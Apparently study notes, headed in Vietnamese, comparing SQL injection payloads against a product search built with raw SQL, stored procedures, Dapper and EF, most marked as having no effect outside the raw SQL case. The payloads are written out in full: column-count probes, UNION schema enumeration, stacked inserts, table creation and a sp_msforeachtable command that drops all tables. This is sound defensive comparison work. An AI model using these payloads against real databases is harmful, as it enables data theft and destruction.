# SQL Injection

## SQL raw

### Vi du 1: Check so luong cot

- Qua nhieu cot

``` sql
product 1' ORDER BY 60 --
```

- Dung so luong cot

``` sql
product 1' ORDER BY 21 --
```

### Vi du 2: Check table name hoac cai gi khac

``` sql
product 1445435' UNION ALL SELECT 1, TABLE_NAME, 3, '4', 5, 6, 7, '8', '9', 10, 11, 12, '13', '14', '15', '16', '17', '18', '19', '20', 21 FROM INFORMATION_SCHEMA.TABLES ORDER BY 2 OFFSET 5 ROWS FETCH NEXT 1 ROW ONLY --
```

### Vi du 3: Check column name and column type

``` sql
product 1445435' UNION ALL SELECT 1, CONCAT(COLUMN_NAME, ' - ', DATA_TYPE), 3, '4', 5, 6, 7, '8', '9', 10, 11, 12, '13', '14', '15', '16', '17', '18', '19', '20', 21 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Functions' ORDER BY 2 OFFSET 5 ROWS FETCH NEXT 1 ROW ONLY --
```

### Vi du 4: Insert new data

``` sql
product 1445435'; INSERT dbo.Products (Name, CategoryId, Image, Price, PromotionPrice, OriginalPrice, Description, Content, HomeFlag, HotFlag, ViewCount, Tags, Unit, SeoPageTitle, SeoAlias, SeoKeywords, SeoDescription, DateCreated, DateModified, Status) VALUES('hack', 1, 'hack', 0, 0, 0, 'hack', 'hack', 0, 0, 0, 'hack', 'hack', 'hack', 'hack', 'hack', 'hack', 'hack', 'hack', 0) --
```

### Vi du 5: Them table va du lieu

``` sql
product 1';CREATE TABLE HackTable(Id INT PRIMARY KEY, UserName VARCHAR(MAX), UserPassword VARCHAR(MAX));INSERT INTO HackTable(Id, UserName, UserPassword)VALUES(1, 'hacker', 'hacker'); --
```

### Vi du 6: Drop table

```sql
product 1'; DROP TABLE HackTable; --
```

### Vi du 7: Drop all tables bang store procedure

``` sql
product 1'; EXEC sp_msforeachtable 'ALTER TABLE ? NOCHECK CONSTRAINT all'; EXEC sp_msforeachtable 'DROP TABLE ?' --
```

---

## Store procedure

### Vi du 1: Check so luong cot

- Khong co tac dung

``` sql
product 1' ORDER BY 60 --
```

``` sql
product 1' ORDER BY 21 --
```

### Vi du 2: Check table name hoac cai gi khac

- Khong co tac dung
  
``` sql
product 1445435' UNION ALL SELECT 1, TABLE_NAME, 3, '4', 5, 6, 7, '8', '9', 10, 11, 12, '13', '14', '15', '16', '17', '18', '19', '20', 21 FROM INFORMATION_SCHEMA.TABLES ORDER BY 2 OFFSET 5 ROWS FETCH NEXT 1 ROW ONLY --
```

### Vi du 3: Check column name and column type

- Khong co tac dung

``` sql
product 1445435' UNION ALL SELECT 1, CONCAT(COLUMN_NAME, ' - ', DATA_TYPE), 3, '4', 5, 6, 7, '8', '9', 10, 11, 12, '13', '14', '15', '16', '17', '18', '19', '20', 21 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Functions' ORDER BY 2 OFFSET 5 ROWS FETCH NEXT 1 ROW ONLY --
```

### Vi du 4: Insert new data

- Khong co tac dung

``` sql
product 1445435'; INSERT dbo.Products (Name, CategoryId, Image, Price, PromotionPrice, OriginalPrice, Description, Content, HomeFlag, HotFlag, ViewCount, Tags, Unit, SeoPageTitle, SeoAlias, SeoKeywords, SeoDescription, DateCreated, DateModified, Status) VALUES('hack', 1, 'hack', 0, 0, 0, 'hack', 'hack', 0, 0, 0, 'hack', 'hack', 'hack', 'hack', 'hack', 'hack', 'hack', 'hack', 0) --
```

### Vi du 5: Them table va du lieu

- Khong co tac dung

``` sql
product 1';CREATE TABLE HackTable(Id INT PRIMARY KEY, UserName VARCHAR(MAX), UserPassword VARCHAR(MAX));INSERT INTO HackTable(Id, UserName, UserPassword)VALUES(1, 'hacker', 'hacker'); --
```

### Vi du 6: Drop table

- Khong co tac dung

```sql
product 1'; DROP TABLE HackTable; --
```

### Vi du 7: Drop all tables bang store procedure

- Khong co tac dung

``` sql
product 1'; EXEC sp_msforeachtable 'ALTER TABLE ? NOCHECK CONSTRAINT all'; EXEC sp_msforeachtable 'DROP TABLE ?' --
```

## Dapper

### Vi du 1: Check so luong cot

- Khong co tac dung

``` sql
product 1' ORDER BY 60 --
```

``` sql
product 1' ORDER BY 21 --
```

### Vi du 2: Check table name hoac cai gi khac

- Khong co tac dung
  
``` sql
product 1445435' UNION ALL SELECT 1, TABLE_NAME, 3, '4', 5, 6, 7, '8', '9', 10, 11, 12, '13', '14', '15', '16', '17', '18', '19', '20', 21 FROM INFORMATION_SCHEMA.TABLES ORDER BY 2 OFFSET 5 ROWS FETCH NEXT 1 ROW ONLY --
```

### Vi du 3: Check column name and column type

- Khong co tac dung

``` sql
product 1445435' UNION ALL SELECT 1, CONCAT(COLUMN_NAME, ' - ', DATA_TYPE), 3, '4', 5, 6, 7, '8', '9', 10, 11, 12, '13', '14', '15', '16', '17', '18', '19', '20', 21 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Functions' ORDER BY 2 OFFSET 5 ROWS FETCH NEXT 1 ROW ONLY --
```

### Vi du 4: Insert new data

- Khong co tac dung

``` sql
product 1445435'; INSERT dbo.Products (Name, CategoryId, Image, Price, PromotionPrice, OriginalPrice, Description, Content, HomeFlag, HotFlag, ViewCount, Tags, Unit, SeoPageTitle, SeoAlias, SeoKeywords, SeoDescription, DateCreated, DateModified, Status) VALUES('hack', 1, 'hack', 0, 0, 0, 'hack', 'hack', 0, 0, 0, 'hack', 'hack', 'hack', 'hack', 'hack', 'hack', 'hack', 'hack', 0) --
```

### Vi du 5: Them table va du lieu

- Khong co tac dung

``` sql
product 1';CREATE TABLE HackTable(Id INT PRIMARY KEY, UserName VARCHAR(MAX), UserPassword VARCHAR(MAX));INSERT INTO HackTable(Id, UserName, UserPassword)VALUES(1, 'hacker', 'hacker'); --
```

### Vi du 6: Drop table

- Khong co tac dung

```sql
product 1'; DROP TABLE HackTable; --
```

### Vi du 7: Drop all tables bang store procedure

- Khong co tac dung

``` sql
product 1'; EXEC sp_msforeachtable 'ALTER TABLE ? NOCHECK CONSTRAINT all'; EXEC sp_msforeachtable 'DROP TABLE ?' --
```

---

## EF

### Vi du 1: Check so luong cot

- Khong co tac dung

``` sql
product 1' ORDER BY 60 --
```

``` sql
product 1' ORDER BY 21 --
```

### Vi du 2: Check table name hoac cai gi khac

- Khong co tac dung
  
``` sql
product 1445435' UNION ALL SELECT 1, TABLE_NAME, 3, '4', 5, 6, 7, '8', '9', 10, 11, 12, '13', '14', '15', '16', '17', '18', '19', '20', 21 FROM INFORMATION_SCHEMA.TABLES ORDER BY 2 OFFSET 5 ROWS FETCH NEXT 1 ROW ONLY --
```

### Vi du 3: Check column name and column type

- Khong co tac dung

``` sql
product 1445435' UNION ALL SELECT 1, CONCAT(COLUMN_NAME, ' - ', DATA_TYPE), 3, '4', 5, 6, 7, '8', '9', 10, 11, 12, '13', '14', '15', '16', '17', '18', '19', '20', 21 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Functions' ORDER BY 2 OFFSET 5 ROWS FETCH NEXT 1 ROW ONLY --
```

### Vi du 4: Insert new data

- Khong co tac dung

``` sql
product 1445435'; INSERT dbo.Products (Name, CategoryId, Image, Price, PromotionPrice, OriginalPrice, Description, Content, HomeFlag, HotFlag, ViewCount, Tags, Unit, SeoPageTitle, SeoAlias, SeoKeywords, SeoDescription, DateCreated, DateModified, Status) VALUES('hack', 1, 'hack', 0, 0, 0, 'hack', 'hack', 0, 0, 0, 'hack', 'hack', 'hack', 'hack', 'hack', 'hack', 'hack', 'hack', 0) --
```

### Vi du 5: Them table va du lieu

- Khong co tac dung

``` sql
product 1';CREATE TABLE HackTable(Id INT PRIMARY KEY, UserName VARCHAR(MAX), UserPassword VARCHAR(MAX));INSERT INTO HackTable(Id, UserName, UserPassword)VALUES(1, 'hacker', 'hacker'); --
```

### Vi du 6: Drop table

- Khong co tac dung

```sql
product 1'; DROP TABLE HackTable; --
```

### Vi du 7: Drop all tables bang store procedure

- Khong co tac dung

``` sql
product 1'; EXEC sp_msforeachtable 'ALTER TABLE ? NOCHECK CONSTRAINT all'; EXEC sp_msforeachtable 'DROP TABLE ?' --
```
